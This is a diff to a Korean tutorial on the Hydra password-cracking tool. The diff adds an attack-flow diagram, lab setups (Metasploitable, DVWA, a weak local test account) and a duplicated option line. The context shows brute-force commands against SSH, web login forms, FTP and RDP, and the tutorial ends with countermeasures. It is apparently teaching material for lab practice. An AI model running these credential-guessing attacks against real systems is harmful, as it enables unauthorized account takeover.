@@ -15,7 +15,21 @@ SSH, FTP, RDP, HTTP-Form, DB 등 50개 이상의 다양한 프로토콜을 지�
 
 ---
 
-## 2. 기본 사용법
+## 2. 공격 흐름
+
+```mermaid
+flowchart LR
+    A[대상 서비스 식별] --> B[사전 파일 준비]
+    B --> C[Hydra 실행]
+    C --> D{인증 성공?}
+    D -->|Yes| E[유효 계정 발견]
+    D -->|No| F[다음 조합 시도]
+    F --> C
+```
+
+---
+
+## 3. 기본 사용법
 
 Hydra의 기본 구문은 다음과 같다.
 
@@ -32,9 +46,35 @@ hydra [옵션] [대상 IP] [프로토콜] [모듈 옵션]
 *   **-v / -V**: 상세 정보 출력 (`-V`는 모든 시도 과정을 보여줌)
 *   **-f**: 첫 번째 유효 계정을 찾으면 즉시 공격 중단
 
+*   **-f**: 첫 번째 유효 계정을 찾으면 즉시 공격 중단
+
 ---
 
-## 3. 공격 실습: SSH
+## 4. 실습 환경
+
+### Metasploitable 2
+```bash
+# SSH, FTP 등 다양한 취약 서비스 제공
+# https://sourceforge.net/projects/metasploitable/
+hydra -l msfadmin -P rockyou.txt 192.168.56.101 ssh
+```
+
+### DVWA (Docker)
+```bash
+# 웹 폼 크래킹 실습 (Brute Force 메뉴)
+docker run -d -p 80:80 vulnerables/web-dvwa
+```
+
+### 테스트용 로컬 계정
+```bash
+# 임시 계정 생성 후 SSH 크래킹 테스트
+sudo useradd -m testuser
+echo "testuser:password123" | sudo chpasswd
+```
+
+---
+
+## 5. 공격 실습: SSH
 
 가장 기본적인 SSH 서비스에 대한 공격이다. 대규모 사전 파일(`rockyou.txt`)을 사용하여 `user` 계정의 비밀번호를 크랙한다.
 
@@ -48,7 +88,7 @@ hydra -l user -P /usr/share/wordlists/rockyou.txt -t 4 192.9.200.11 ssh
 
 ---
 
-## 4. 공격 실습: 웹 로그인 폼
+## 6. 공격 실습: 웹 로그인 폼
 
 웹 애플리케이션의 HTML 로그인 폼에 대해서도 공격이 가능하다. `http-post-form` 모듈을 사용하며, 전송할 패킷 구조를 정확히 지정해야 한다.
 
@@ -68,7 +108,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.9.200.11 http-post-form "
 
 ---
 
-## 5. 공격 실습: FTP & RDP
+## 7. 공격 실습: FTP & RDP
 
 ### FTP 서비스
 아이디와 비밀번호 모두 사전 파일을 사용하여 `Any:Any` 조합을 찾는다.
@@ -84,7 +124,7 @@ hydra -l Administrator -P pass.txt -t 1 -W 5 rdp://192.9.200.11
 
 ---
 
-## 6. 보안 대책
+## 8. 보안 대책
 
 *   **계정 잠금 정책 (Account Lockout)**: 5회 이상 로그인 실패 시 계정을 잠그거나 로그인 시도를 지연시킨다.
 *   **Fail2Ban 사용**: 로그를 실시간으로 모니터링하여 반복적인 실패 시도가 감지된 IP를 방화벽에서 즉시 차단한다.
